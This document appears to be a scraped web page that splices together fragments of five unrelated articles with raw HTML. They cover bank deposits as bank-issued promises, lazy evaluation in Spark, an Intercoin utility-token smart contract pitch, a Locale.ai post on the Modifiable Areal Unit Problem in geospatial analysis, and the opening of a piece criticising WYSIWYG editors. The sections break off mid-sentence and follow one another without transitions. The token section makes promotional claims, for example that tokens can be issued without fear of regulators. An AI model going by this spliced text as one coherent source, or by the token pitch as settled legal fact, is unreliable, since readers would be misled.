autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>This article can also also be seen in YouTube form!</figcaption></figure><p>Confusingly, both the <em>thing put in</em>, and the <em>thing issued out</em> are called 'money' - if I 'pay by cash' I'm using state money, but if I '<a href="https://youtu.be/aem0rvvPKMQ">pay by card</a>' I'm using bank money, but in both scenarios I'll coloquially say 'I used money to pay'. To return to our water metaphor, this is like calling both water and a promise for water, 'water'). The accurate way to refer to 'paying by card' is to say 'paying by bank deposit transfer', which is the banking equivalent of using a casino chips to pay for something.</p><h3 id="promises-for-the-treasure-chest">Promises for the treasure chest</h3><p>I do not know the etymology of the noun 'bank deposit', but I'm guessing the confusion it creates emerges from a shortening of a term like 'deposit slip'. Imagine the following diary entry, perhaps coming from a 19th century merchant trying out a bank for the first time: </p><!--kg-card-begin: markdown--><blockquote>
<p>"Today I deposited all my state money into Barclays bank. The clerk issued me a deposit receipt, recognising that I had handed over ownership of my money to them, but promising me that I could come reclaim it. This slip - with its promise - is now my money."</p>
</blockquote>
<!--kg-card-end: markdown--><p>Nowadays these 'deposit receipts' are digital chips, and the 'receipt' part has been dropped, shortening the term to 'deposit'. This slippage has caused the verb and noun to diverge from their traditional English-language pairing, but the 'outward-facing receipt' nature of deposits is easily confirmed by looking at a bank balance sheet. Here's one from Barclays:</p><figure><img src="https://alteredstatesof.money/content/images/2020/07/Deposit-Balance-Sheet-2-1.png" alt="" srcset="https://alteredstatesof.money/content/images/size/w600/2020/07/Deposit-Balance-Sheet-2-1.png 600w, https://alteredstatesof.money/content/images/size/w1000/2020/07/Deposit-Balance-Sheet-2-1.png 1000w, https://alteredstatesof.money/content/images/2020/07/Deposit-Balance-Sheet-2-1.png 1131w" sizes="(min-width: 720px) 720px"></figure><p>If deposits were ‘in’ the bank, they would be in the <em>assets</em> section on top. The assets section is like a record of the bank's ‘treasure chest’, with the things it <em>owns</em>. Notice, however, that 'deposits' are actually located in the <em>liabilities </em>section of the balance sheet, which records the promises that the bank has made (against the backdrop of the things it has in its 'treasure chest'), such as ‘we promise to pay you bondholders in two years’, or ‘we promise you state money on demand’. This latter promise is the ‘deposits’, and they are not ‘inside the glass’, because the glass is in the assets section.</p><h3 id="dispelling-the-deposit-myth-from-fractional-reserve-">Dispelling the deposit myth from 'fractional reserve'</h3><p>But it gets better. Do you notice that 'deposits' on the liabilities side of Barclays balance sheet far exceed the 'cash and balances at central bank' category in their assets section? In our water metaphor, this means 'the promises for water we've issued out far exceeds the water in our glass'.</p><p>This is a result of what is sometimes called 'fractional reserve banking' (albeit I use the term 'credit creation of money')</p><p>Fractional reserve banking is a favourite bogeyman for bank critics to attack, but it's frequently misrepresented due to our misunderstanding about the nature of deposits. Let me explain.</p><p>If you start from the assumption that a deposit is a ‘thing inside the bank’, rather than a ‘thing issued out by the bank’, you will be prone to explaining fractional reserve banking as follows: </p><!--kg-card-begin: markdown--><blockquote>
<p>‘I deposit money into the bank, but they then secretly give it away to someone else whilst telling you it is still there’</p>
</blockquote>
<!--kg-card-end: markdown--><p>If this is you, you've made an error, and have fallen into the trap of thinking that banks 'lend out the water that I've put inside them'. This also means you've failed to make a distinction between the two forms of money in our society: state money ('water'), and bank money ('promise for water'). And both of these misunderstandings are facilitated by the linguistic glitch we are trying to deprogram. </p><p>To accurately rewire your understanding, you must start from the recognition that your money ('bank deposits') is <em>issued out</em> by banks. The bank issues out promises for water in the glass, <em>but</em> - and this is crucial - they can issue out many more promises for water than they actually have. There is no process of them 'sneaking away water to give to someone else'. They don't touch the water. All they do is increase the number of promises they issue for it. Given that these bank promises are called deposits, it follows that deposits can be issued - and thereby expand - even if nothing was ‘deposited’. </p><p>But why would banks do that? Well, because they issue these short-term promises to extract more valuable long-term promises from the people they issue the short-term promises to. Those long-term promises end up in the assets section of the balance sheet, in that section called 'loans'. Yes, a loan is not 'water from the bank'. It is 'short-term promises for water from the bank, in exchange for long-term promises for water from you'.</p><p>Yes, banks can create assets by issuing liabilities, which is a more complex topic for another article, but if I had to adapt the water metaphor, I'd say something like <em>'when banks issue out excess promises for water in the glass, they conjur into being a portfolio of ghostly ice-statues that will attract melt-water towards the glass'...</em></p><p>That metaphor probably needs some work, but it's a good place to start.</p><h3 id="update-the-dictionary">Update the dictionary</h3><p>The verb-noun glitch creates all manner of weird anomalies when you start to play with it. For example, if I do indeed insist on 'depositing a bank deposit' it will in fact disappear, because - using our rewired understandings of those terms - that would actually mean 'handing back to the bank its own promises'. Incidentally, this is actually what happens when you 'repay a loan'. You are literally destroying bank money.</p><p>If that is too complex, don't worry. I'll make more articles and <a href="https://www.youtube.com/c/brettscott">money mythbusting videos</a> about this, with new metaphors.</p><p>I'll close, finally, with a suggestion for you Merriam-Webster, because I'm guessing you haven't updated this since 1828...</p><figure><img src="https://alteredstatesof.money/content/images/2020/07/Bank-Deposit-3.png" alt="" srcset="https://alteredstatesof.money/content/images/size/w600/2020/07/Bank-Deposit-3.png 600w, https://alteredstatesof.money/content/images/size/w1000/2020/07/Bank-Deposit-3.png 1000w, https://alteredstatesof.money/content/images/size/w1600/2020/07/Bank-Deposit-3.png 1600w, https://alteredstatesof.money/content/images/2020/07/Bank-Deposit-3.png 1749w" sizes="(min-width: 1200px) 1200px"></figure><p>In order to avoid the time-consuming job of dealing with the spambots and fraudsters who troll comments sections, I've decided to try something different.

    <p>There are so many great ideas in engineering we can take home and
 apply to our own lives.  Today I will talk about one of them: lazy
 evaluation.</p>

<!--more-->

<h3 id="the-concept">The Concept</h3>

<p>Lazy evaluation is simple to state: when given a task, you don’t start
doing it right away.  Instead, you keep accumulating tasks until you
see an end-goal.  At that point, you work backwards to do just enough
work.</p>

<p>It’s simple, but it’s counter-intuitive.  You have to wrestle with it
a bit to understand it.  Let me give an example from Spark, which is
the poster-child of lazy evaluation strategies.</p>

<p>Suppose you want to select some rows in a table, filter based on a
condition, then save as a table.  In Spark, you could say:</p>

<figure><pre><code data-lang="python"><span>df</span><span>.</span><span>select</span><span>(</span><span>"*"</span><span>).</span><span>filter</span><span>(</span><span>"foo &gt; 50"</span><span>).</span><span>saveAsTable</span><span>(</span><span>"finalTable"</span><span>)</span></code></pre></figure>

<p>Let’s break it down.</p>

    <p>Note the first function call.  When Spark sees <code>df.select("*")</code>, does
it fetch everything from the table?  No!  It only saves a note, and
continues to look for an end-goal.</p>
  </li>
  <li>
    <p>You then specify a condition to filter upon: still not an end goal,
so it adds to its notes and continues to wait.</p>
  </li>
  <li>
    <p>Then, it sees an output call, the <code>saveAsTable()</code>.  Ah, here comes
the end-goal.</p>
  </li>
</ol>

<p>Spark now works <em>backward</em>: it sees a filter.  Before that, it sees a
<code>select("*")</code>.  It can push the condition <em>backwards</em> to the select,
so that rows that do not match can be discarded immediately at read
time.  Quite efficient.</p>

<p>Now imagine if Spark worked like traditional eager programs.  You
would run out of memory right at the <code>select("*")</code> step, and the job
would fail.</p>

<h3 id="in-real-life">In real life</h3>

<p>Lazy evaluation is a very powerful idea.  It gives you a framework to
know what to do, in the face of unlimited information: It says, you
should not be eager.</p>

<p>We live in an age where data is infinite.  There is a multitude of
courses, books, websites on any important topic, and there are new
things coming out every day.  You cannot eagerly learn everything out
there.  There’s not enough time, and even if you did, as an individual
you’re a weak learner.<sup>1</sup></p>

<p>Instead, the lazy evaluation recipe is as follows:</p>

<ol>
  <li>
    <p>You should ask yourself, <em>what is your end goal?</em> What do you need
to know or do, based on that end-goal, and what can you stop doing?</p>
  </li>
  <li>
    <p>Out of all the things you could be doing, you should select (or at
least prioritize) those that will take you <em>closer</em> to your end-goal.</p>
  </li>
  <li>
    <p>Further, you should minimize or eliminate tasks that do not lead to
your end goal, or at least you should be aware that they could be
wasted effort.</p>
  </li>
</ol>

<p>Of course, it’s not always possible to know what can or cannot lead
into the output.  But it’s important to keep this in our mind, so that
we can limit the damage if we stray from the path, by stopping such
work after a pre-determined point in time.</p>

<h3 id="two-examples">Two Examples</h3>

<p>This situation frequently happens during a career move.  Interviews
are daunting because they may choose to ask anything, so you should be
prepared for everything, right?  And also learn all the new things
since you left school?</p>

<p>Instead, a different strategy is to look at job descriptions for the
role or companies you would like to go to.  You build a list of skills
you need to know, and continue to work backward on acquiring those
skills from the best possible resource in a reasonable amount of time.</p>

<p>A similar situation can occur in research-oriented projects, where it
is easy to lose track of the deliverable in the name of research or
trying new ideas.  Especially in machine learning, a complex model
with say 78% accuracy is not that much better than a simpler model with
75% accuracy.</p>

<h3 id="not-a-new-idea">Not a New Idea</h3>

<p>The idea of lazy evaluation is not new.  Relational databases have
been building query plans since 1980s.  The concept is part of the
functional programming repertoire since 1970.  Operating systems do
not load the entire program into memory: they load the relevant pages
as your program executes, a concept known as lazy loading.</p>

<p>Amazingly for a technical idea, lazy evaluation seems to be well-known
in self help literature: Steven Covey said in his famous <em>Seven
Habits</em> book, “Begin with the end in mind”.  One would hope he had an
intuition about lazy evaluation.</p>

<p>Lazy evaluation is one of those flywheel ideas.  When you apply it, it
should create less wasted work.  This should create more time, and in
this time, you probably apply the same idea to more projects and
deliver them well.  This is the flywheel.</p>

<p>In any case, don’t attempt to do a <code>select("*")</code> on an infinite
knowledgebase.</p>

<p>–</p>

<p><small><sup>1</sup> This is a concept in machine learning, where a
bunch of different models can often do better than any single model.
It is known as an ensemble.  I like to think of Kaggle.com as an
ensemble of humans, often coming up with ensembles of learning
models.</small></p>

          <p><img src="https://forum.intercoin.org/uploads/default/original/1X/eb4018ded8d596349cb201267f7e18f5fa03785a.png" alt="" width="613" height="130"></p>
<p><strong>Summary</strong></p>
<p>Intercoin Inc. is finishing its work developing smart contracts on the Ethereum platform to allow any project to raise money to build their network, issue their own utility tokens, give them to their backers, peg them to fiat, and get unlimited and fair liquidity for them. No one would have to pay a lot to get onto a centralized exchange, because the whole thing could be launched on the permissionless Ethereum blockchain just as one can launch a website on the Web. Merchants on the platform would be able to accept the tokens, and cash them out, selling them to the next customers.  Token holders everywhere will push others to buy and accept the tokens, growing the network effect of the project.</p>
<p>This can finally realize the original dream of permissionless, trustless networks that are owned by the participants, rather than centralized platforms extracting rents forever on behalf of the original investors and developers. It will transition our society’s innovation engine from competition to collaboration, like we see with open source, wikipedia, and science. People will be compensated <a href="https://qbix.com/blog/2016/11/17/properly-valuing-contributions/">fairly</a>. Open source software and journalism can be monetized. And all this can be done without fear of regulators coming after the issuers of the tokens. This is not a fantasy! This is the environment our new DeFi product, the Utility Token Contract, will bring about.</p>
<p><strong>The Landscape Today</strong></p>
<p>Decentralized Finance, or DeFi, is all the rage in 2020, with investors funding many projects to create financial applications that don’t require trusting any centralized party. This reflects a <a href="https://www.usv.com/writing/2018/10/the-myth-of-the-infrastructure-phase/">general trend, that Fred Wilson from Union Square Ventures has pointed out</a>, that new applications beget new infrastructure (web3.js) which lets the industry build better apps.</p>
<p>It’s especially great the industry is thinking in terms of composability of components. <a href="https://our.status.im/whats-with-defi-and-money-legos/">DeFi has been called “money LEGOs”</a> which warms our heart – we have been building social media LEGOs since 2011 under <a href="https://www.trademarkia.com/company-qbix-inc-3736553-page-1-2">a company whose logo is building blocks</a>.</p>
<p><a href="https://www.forbes.com/sites/billybambrough/2020/07/14/ethereum-is-beating-bitcoin-in-more-ways-than-one/">Ethereum has emerged as the dominant platform</a> for building DeFi applications today. The number of active addresses on Ethereum has doubled just since the start of 2020, while Bitcoin’s has only grown by 50%.</p>
<blockquote>
<p>“The level of development on ethereum is crazy: initial coin offerings, stablecoins, non-fungible tokens, decentralized exchanges and other decentralized finance applications, Web 3 use cases,” <em>- Messari chief executive Ryan Selkis</em></p>
</blockquote>
<p>Current DeFi solutions have centered largely around stablecoins and lending, with all the use cases that go with it. Stablecoins like USDT and DAI have <a href="https://news.bitcoin.com/stablecoin-market-caps-7-billion-volumes-most-pairs/">outstripped most trading pairs in trading volume</a>, as people want to hold crypto assets pegged to their favorite fiat currency. Lending platforms like Celsius recently <a href="https://www.prnewswire.com/news-releases/celsius-network-secures-us10m-equity-raise-with-tether-as-lead-investor-301081105.html">raised a $30MM equity round with Tether as a lead investor</a>.</p>
<p><strong>Filling a Crucial Need: Utility Tokens</strong></p>
<p>With all the excitement surrounding DeFi, people seem to have given up on the initial dream that started it all: utility tokens that powerful countries would not regulate as securities. Let’s recall some of the benefits everyone was pointing out a mere 4 years ago:</p>
<ul>
<li>The network would be <a href="https://avc.com/2016/01/network-equity/">owned by the participants</a> rather than those who launched it</li>
<li>We could finally <a href="https://qbix.com/QBUX/whitepaper.html#Monetizing-Open-Source">monetize open source projects</a> and <a href="https://qbix.com/blog/2016/11/17/properly-valuing-contributions/">properly value contributions</a>
</li>
<li>We could <a href="https://qbix.com/QBUX/whitepaper.html#Monetizing-and-Personalizing-Content">rescue journalism</a> and monetize other online content <a href="https://digiday.com/media/marc-andreessen-ad-tech-fueled-race-bottom-failed-publishers/">without ads</a>
</li>
</ul>
<p>The idea went that utility tokens would be obtained in order to be used, not held for speculative purposes of resale in the future. FileCoin would be used to pay for storing and serving files. Ethereum would be used to pay for transactions on a world computer. The initial development would be financed by pre-selling securities (<a href="https://saftproject.com/static/SAFT-Project-Whitepaper.pdf">remember the SAFT?</a>) that promised the holder a certain number of tokens once the network was up and running. Many analysts were very <a href="https://www.coincenter.org/the-saft-is-a-reasonable-approach-to-securities-law-when-preselling-useful-network-tokens/">bullish on this idea</a>. Even notable crypto curmudgeon Preston Byrne <a href="https://prestonbyrne.com/2017/08/04/thoughts-on-the-saft/">admitted it could be a workable model</a>.</p>
<p><strong>Regulators Strike Back, Return of the Utility Token</strong></p>
<p>Then the regulators created an atmosphere of uncertainty, thorough their messaging and enforcement, and the industry gave up on its dream of crypto-currency transforming the way we fund new projects. We were there, we saw it happen. But since 2018, there have been significant new developments:</p>
<ul>
<li>
<p>June 14, 2018: <a href="https://www.sec.gov/news/speech/speech-hinman-061418">SEC’s Director William Hinman gave a speech</a> where he explicitly compared utility tokens to oranges in <a href="https://www.investopedia.com/terms/h/howey-test.asp">SEC vs Howey</a>, expressing hope that one day we can have true utility tokens go mainstream.</p>
</li>
<li>
<p>April 3, 2019: The SEC <a href="https://www.sec.gov/corpfin/pocketful-quarters-inc-072519-2a1">issues its first No-Action Letter</a> allowing  TurnKey Jet, Inc. to issue bona fide utility tokens.</p>
</li>
<li>
<p>May 19, 2019: <a href="https://www.sec.gov/news/speech/peirce-how-we-howey-050919">SEC’s Commissioner Hester Pierce</a> expressed clear interest in allowing forbearance and sandboxes to allow new innovation and opportunities in crypto to develop.</p>
</li>
<li>
<p>July 25, 2019: <a href="https://www.sec.gov/corpfin/pocketful-quarters-inc-072519-2a1">SEC issues a second No-Action Letter</a>, this time to Pocketful of Quarters, Inc. that goes further than TurnKey Jet, and allows approved and KYC-ed service providers to exchange the tokens for ETH at predetermined exchange rates.</p>
</li>
</ul>
<p><strong>Safe Harbor for Utility Tokens</strong></p>
<p>These <a href="https://www.sec.gov/corpfin/pocketful-quarters-inc-072519-2a1">no-action letters</a> have created a safe harbor for issuers of utility tokens, that can fit within the requirements spelled out in the letters. They are as follows:</p>
<blockquote>
<ul>
<li>PoQ will not use any funds from Quarters sales to build the Quarters Platform, which has been fully developed and will be fully functional and operational immediately upon its launch and before any of the Quarters are sold;</li>
<li>the Quarters will be immediately usable for their intended purpose (gaming) at the time they are sold;</li>
<li>PoQ will implement technological and contractual provisions governing the Quarters and the Quarters Platform that restrict the transfer of Quarters to PoQ or to wallets on the Quarters Platform;</li>
<li>gamers will only be able to transfer Quarters from their Quarters Hot Wallets for gameplay to addresses of Developers with Approved Accounts or to PoQ in connection with participation in e-sports tournaments;</li>
<li>only Developers and Influencers with Approved Accounts will be capable of exchanging Quarters for ETH at pre-determined exchange rates by transferring their Quarters to the Quarters Smart Contract;</li>
<li>to create an Approved Account, Developers and Influencers will be subject to KYC / AML checks at account initiation as well as on an ongoing basis;</li>
<li>Quarters will be made continuously available to gamers in unlimited quantities at a fixed price;</li>
<li>there will be a correlation between the purchase price of Quarters and the market price of accessing and interacting with Participating Games; and</li>
<li>PoQ will market and sell Quarters to gamers solely for consumptive use as a means of accessing and interacting with Participating Games.</li>
</ul>
</blockquote>
<p><strong>Level 1: The Utility Token Contract</strong></p>
<p>We set out to build a smart contract which neatly fits all the above criteria, about which Hester Pierce said the transactions are <em>“so clearly <em>not</em> an offer of securities that I worry the staff’s issuance of a digital token no-action letter… may in fact have the effect of broadening the perceived reach of our securities laws. If these tokens  <em>were</em>  securities, it would be hard to distinguish them from any medium of stored value.”</em></p>
<p>Suppose you are building a new network of buyers and sellers, and you want to launch a new token <strong>X</strong> for your ecosystem. The Utility Token Contract is designed to issue an unlimited amount of <strong>X</strong> and make it available to buy at a fixed price with a stablecoin (such as 1 USDT or 1 DAI). Anyone can buy <strong>X</strong> simply by sending USDT to the contract, and receiving the corresponding amount of <strong>X</strong> in return. They can also sell each <strong>X</strong> to the contract in exchange for a discount, say 0.9 USDT.</p>
<p>As long as the smart contract always sells each minted <strong>X</strong> for 1 USDT, it will always have enough USDT to buy back the tokens. Moreover, no rational buyer would spend more than $1 for <strong>X</strong> when they can buy it in unlimited quantities from the contract. Similarly, no rational seller would accept less than 90 cents for each <strong>X</strong> since they can sell it back to the contract.</p>
<p>However, “market makers” could appear, who trade within the narrow range, buying for 98 cents and selling for 92 cents, for example. This creates an opportunity for more entities to buy and sell the token, without making the token itself a security.</p>
<p>There is no need to pay a centralized exchange to get the token listed, if the contract is always standing ready to buy or sell. But because merchants and others who accept <strong>X</strong> will only get 90 cents instead of $1 if they send it to the contract, everyone holding <strong>X</strong> will be asking their employees and suppliers to start accepting some payments in <strong>X</strong> as well, increasing its network effect and overall market cap. Have you ever asked people to consider taking payment in Bitcoin or Ethereum? That’s what it looks like.</p>
<p><strong>Level 2: Pre-Selling the Token</strong></p>
<p>Although our Utility Token Contract, as described above, would already benefit any existing project, we can go further.  Because the project deploying the smart contract becomes its owner, they will be able to tell the contract to mint some <strong>X</strong> and send it to specific addresses for free.</p>
<p>The project can use this ability to pre-sell some of the tokens using a SAFT (<a href="https://www.coincenter.org/the-saft-is-a-reasonable-approach-to-securities-law-when-preselling-useful-network-tokens/">which is a security transaction</a>), and once people begin buying <strong>X</strong> from the contract to use for utility purposes, the contract owner can start to tell the contract to give out <strong>X</strong> tokens, which have real value because the network is up and running, with at least one merchant (the project itself) willing to provide services.</p>
<p>However, giving out too many tokens can create an imbalance in the issuing contract, where the contract does not have enough USDT to buy back all the <strong>X</strong> outstanding. This is a situation similar to fractional reserve banking: since not everyone is going to demand all the <strong>X</strong> at once, the contract can in fact hold smaller reserves of USDT to <strong>X</strong>. It starts out with a 10% surplus, and may go down to an 80% deficit (20% reserves.)</p>
<p>Since buyers of <strong>X</strong> would naturally be concerned about this situation, each …</p></div></div>

                <div>
                    <p>Co-author: <a href="https://www.linkedin.com/in/rishabh-jain-2b0377b6/">Rishabh Jain</a></p><h2 id="introduction">Introduction</h2><p>At <a href="http://locale.ai/" rel="noopener">Locale.ai</a>, we work with a number of last-mile and hyperlocal and mobility companies. For most of these companies, geospatial analysis is critical and typically, they have internal dashboards built on a BI platform or in-house using open source tools.</p><p>One of the reasons they use our product is to highlight what areas to focus on and how to contextualize their strategies to those areas. A caveat here is that these areas are not our traditional defined areas in a city or zip-codes. In this post, we will deep dive into why using traditional area definitions is not a good idea to carry out geospatial analysis.</p><h2 id="maps-don-t-always-tell-the-truth-">Maps don’t always tell the truth!</h2><p>Based on intuitive logic, companies either go with a zip-code boundary or some hand-drawn neighbourhood boundaries to map their most critical metrics like market potential, utilisation, average customer value, etc. These form an important part of decisions like what areas to expand into, shoot promotions in, or provision more supply.</p><p>Now, if you’re a business with little or no intra-city operations, the difference might not be significant to you. But if you provide services in the last mile or at a hyperlocal level, the differences in insights have a significant impact on the decisions that the business and city teams use.</p><p><em>Which brings me to the next question: <strong>Why is this difference significant?</strong></em></p><p>Often what happens is the zip codes or arbitrarily defined neighbourhood boundaries that the nuances that the different areas depict tend to get dissolved.</p><blockquote>In other words, a zip code that we treat as one big cell for analysis consists of many smaller cells without any similarity in demographics or economic potential.</blockquote><figure><img src="https://cdn-images-1.medium.com/max/640/0*uI0tq7P1PGDpJEwP"><figcaption>Source: Wikipedia</figcaption></figure><p>This is illustrated by the fact that, if you live in Palo Alto, you are a part of the world’s foremost innovation hub and are paying median home prices of $1.18 million. However, just right across the train tracks, 18% percent of East Palo Alto residents live below the poverty line where the average yearly income per person is $18,385.</p><blockquote>The characteristic behaviour of these two areas would be very different and while they would be present in the data that you collect, they often aren’t so easy to unearth.</blockquote><p>In the next section, we would like to show you how easily the maps can lie and why different members in your team recommend completely different areas in a city to focus on based on the same set of metrics!</p><hr><h3 id="nyc-city-manager-s-woes">NYC City Manager’s Woes</h3><p>Let’s consider that you are Uber’s city manager, and want to run contextual promotions and discounts in areas where you have high market potential or market share. For this exercise, we used the Uber Cab dataset available <a href="https://www.kaggle.com/fivethirtyeight/uber-pickups-in-new-york-city#uber-raw-data-apr14.csv">here</a> and the NYC Yellow Taxi dataset available <a href="https://data.cityofnewyork.us/Transportation/2014-Yellow-Taxi-Trip-Data/gn7m-em8n">here</a>. Now, we can simply define market-potential as</p><figure><img src="https://blog.locale.ai/content/images/2020/05/image.png"></figure><p>For our area definitions, we choose the <a href="ttps://geodata.lib.berkeley.edu/download/file/nyu-2451-34204-geojson.json">NYC housing areas</a> and <a href="https://geodata.lib.berkeley.edu/download/file/nyu-2451-34509-geojson.json">NYC zip-code areas</a>. Using these two area definitions, we calculate the market potential and here's the plot:</p><figure><img src="https://blog.locale.ai/content/images/2020/05/zip_vs_house-1.png" alt="Left and Right show M.P by Zip-Code and Housing areas respectively."><figcaption>Left and Right show M.P by Zip-Code and Housing areas respectively</figcaption></figure><p><em>Greener means more Market Potential for Uber and pinker means it is already doing well in that area.</em> When we try to filter areas by M.P greater than 70% to identify the top areas to run promotions in, we see the following areas:</p><figure><img src="https://blog.locale.ai/content/images/2020/05/zip_vs_house_60.png"><figcaption>Areas with Market Potential greater than 70%</figcaption></figure><p>The areas we got are quite different! </p><h3 id="modifiable-areal-unit-problem">Modifiable Areal Unit Problem</h3><p>Hence, it is safe to conclude that the decision completely changes based on what set of boundaries we use for our analysis. This is a classical problem in geospatial data science known as the <em>Modifiable Areal Unit Problem </em>(MAUP).</p><blockquote>Because of the MAUP problem, our decision becomes reliant on the shape and size of the area instead of the actual characteristics of the users within it.</blockquote><p>The ideal area should have the ideal shape and size. Let’s consider finding that ideal shape. We could divide the geographic plane into squares of the same size, or maybe triangles, pentagons, or something else! We at Locale use hexagons instead of any other shape and you can get a glimpse of why here:</p><figure><a href="https://medium.com/locale-ai/spatial-modelling-tidbits-honeycomb-or-fishnets-68a453ac455e"><div><p>Spatial Modelling Tidbits: Honeycomb or Fishnets?</p><p>If you are a two-degree marketplace like Uber, you cater to millions of users requesting a ride through your driver partners accepting and fulfilling those requests.

Uber has a well-suited library that converts lat, longs to hexes of a given size. You can find out more about it <a href="https://eng.uber.com/h3/" rel="noopener">here</a>.</p><p>From the visualization, we can see the distribution of Market Potential across the city in a much uniform way.

Then, we compute the convex hull of these areas to get area boundaries. Now, we have areas generated from the data itself, suitable for computing MP in a reduced human-bias way. Again, we filter by areas where M.P is more than 70% and get these places:</p><figure><img src="https://blog.locale.ai/content/images/2020/05/infered_60.png"><figcaption>Hotspots detected by our algorithm with highest Market Potentials.</figcaption></figure><p>It’s worth noting that a simple density-based approach can work here because of the nature and definition of the problem.</p><blockquote>Since we consider only locations, a density-based spatial clustering extracts the underlying areas which are more closely knit in terms of the user behaviour.</blockquote><p>For this decision to be actually reliable for a business use case, instead of using just one metric, we take a set of metrics that largely affect the user behaviour in one area. For example, office-goers in an area vs university students might show completely different travel patterns.</p><p>Now, as highlighted here, using the automated learning techniques for similarity and clustering analyses that we have built at Locale.ai, our algorithms work hard to find what areas behave similarly based on the metrics that you care about (growth potential, unit economics, power users) and show you what areas to focus on for each unit of your business.</p><p>This enables you to save or export these<strong><em> areas profiles</em></strong> and keep reusing them for different kinds of analysis and then track them to maximize your revenue, demand and profitability in each of those areas rather than using arbitrarily defined boundaries.</p><p><em>The complete experiment along with the code is available <a href="https://github.com/localeai/Modifiable-Areal-Unit-Problem">here</a>. Feel free to experiment with some other dataset!</em></p><hr><p>If you’ve reached this far, here is a sneak peek into why this forms the base of our entire platform and what all techniques we have developed on top of this:</p><h3 id="similarity-analysis-and-feature-importance">Similarity Analysis and Feature Importance</h3><p>Our geospatial models not only find clusters of areas having unique characteristic, but also tell us why the area is unique. Hence, while identifying clusters of areas based on a combination of metrics, it also pin points the factors that have the most significant impact on these metrics. </p><blockquote>Two different areas don’t necessarily have to be close in order to behave similarly. You can probably use one as a test area to observe and apply the same strategies across cities.</blockquote><h3 id="real-time-monitoring-with-anomaly-detection">Real-time Monitoring with Anomaly Detection</h3><p>It doesn’t make sense is not quite enough to just know that SLAs are not being met only in Bangalore or SFO. Knowing where orders are getting delayed or cancelled, or whether an abnormally high delay in an area is caused by a sudden supply drop because of rain can be very valuable.</p><blockquote>Adding the context of location along with anomalies can make the insights very actionable for us and makes decision-making very simple.</blockquote><hr><p>At Locale, we are building an analytics and visualization product to help city and business teams get precise, real-time insights about how their operations perform without any compromises and dependencies. <em><em>then get in touch for a demo <a href="https://www.locale.ai/" rel="noopener">here</a> or get in touch with me on <a href="https://www.linkedin.com/in/aditi-sinha-6b774ba9/" rel="noopener nofollow noopener noopener">LinkedIn</a> or <a href="https://twitter.com/aditi1002" rel="noopener nofollow noopener noopener">Twitter</a>.</em></em></p><h3 id="read-similar-">Read Similar:</h3><figure><a href="https://blog.locale.ai/geospatial-autocorrelation/"><div><p>Spatial Autocorrelation: Close Objects Affecting Other Close&nbsp;Objects</p><p>Deep dive into spatial autocorrelation and their industry use&nbsp;cases</p><p><img src="https://blog.locale.ai/favicon.png"><span>Anubhav Pattnaik</span><span>Locale.ai</span></p></div><p><img src="https://blog.locale.ai/content/images/2020/03/0_m9ZlJLgXoW2u5R0S.jpg"></p></a></figure>

But alas, that’s usually the last thing math folks have in mind when it comes to the task…</p><p>In fact, in what follows, we’ll introduce you to the fascinating world of <strong>mathematical typesetting</strong>. We’ll also introduce you to a marvelous tool adopted by a wide range of technical scientists — so that they can communicate with each other with precision and ease.</p><div id="attachment_1057"><p><img aria-describedby="caption-attachment-1057" src="https://mathvault.ca/wp-content/uploads/professional-typesetting-e1440887059415.jpg" alt="LaTeX - A Professional Typesetting System for Scientific and Technical Publications" width="681" height="364" title="professional typesetting e1440887059415" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20681%20364'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/professional-typesetting-e1440887059415.jpg"></p><p id="caption-attachment-1057">Typesetting meets technology.</p></div><h2><span id="6_Serious_Weaknesses_of_Standard_WYSIWYG_Editors"></span><a id="wysiwyg" href="#toc">6 Serious Weaknesses of Standard&nbsp;WYSIWYG Editors</a><span></span></h2><p>Ever heard of a software application called <em><a href="https://en.wikipedia.org/wiki/Microsoft_Word" target="_blank" rel="noopener noreferrer">Microsoft Word</a></em>? Of course you do! And chances are, you have been using it — or another <a href="https://en.wikipedia.org/wiki/WYSIWYG" target="_blank" rel="noopener noreferrer">What You See Is What You Get (<strong>WYSIWYG</strong>) word processor</a>&nbsp;(e.g., <em>OpenOffice.org Writer</em>,&nbsp;<em>Google Docs</em>)<em> —&nbsp;</em>all along over these years.</p><p>And here is something potentially unpleasant to the ears: what if we were to object that <em>sometimes</em>, they could just be the poor tools designed with the wrong philosophy in mind? Or that they are built primarily for general usage, and is thus ill-suited for <strong>technical publishing</strong> at a wider scale?</p><p>And while these text editors are undoubtedly highly powerful and accessible, there are also 6 <strong>critical flaws</strong> that they tend to suffer from. These range from the ones that may have been annoying you in the past — to the subtler ones that you might not even have been aware of.</p><h3><span id="File_Compatibility"></span><a id="compatibility"></a><a href="#toc">File Compatibility</a><span></span></h3><p>Quick question: How do we open a doc/docx file? With <em>Microsoft Word</em> of course! (or a variant that accepts these filetypes). In other words, opening a <em>Microsoft Word</em> file requires a <em>Microsoft-Word-like</em> application. Try opening these files with basic text editors such as&nbsp;<em>NotePad</em>&nbsp;(or <em>TextEdit</em> in Mac)<em>&nbsp;</em>and see what happens: you’d probably get a bunch of weird and unintelligible symbols that just make no sense!</p><p>In addition to being text-unfriendly, converting these filetypes to other formats — or even just older formats — could very well&nbsp;jeopardize the&nbsp;<strong>formatting</strong>, <strong>alignment</strong>, or other specifications in the document. This would then require another round of judicious manual correction on your own, which could very well be somewhat painful or infuriating. In fact, there have been many recurring episodes of <em>file conversion disasters</em> in the <a href="https://en.wikipedia.org/wiki/Microsoft_Word#Cross-version_compatibility" target="_blank" rel="noopener noreferrer">history of <em>Microsoft Word</em></a>&nbsp;(in the olden days at least).</p><h3 id="cost"><span id="Proprietariness_and_Cost"></span><a href="#toc">Proprietariness and Cost</a><span></span></h3><p>How much does a proper <em>Microsoft Word</em><sup>®</sup> costs? Well, here a picture is worth a thousand words:</p><p><img src="https://mathvault.ca/wp-content/uploads/ms-word-price.jpg" alt="The Price of Microsoft Word 2013 - Microsoft Store" width="1024" height="495" title="ms word price" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20495'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/ms-word-price.jpg"></p><p>Or if you prefer subscription plans for <em>Office 365</em>, which seems at least a bit cheaper on the surface:</p><p><img src="https://mathvault.ca/wp-content/uploads/office-365-price.jpg" alt="The different subscription plans and prices for Office 365" width="1024" height="719" title="office 365 price" 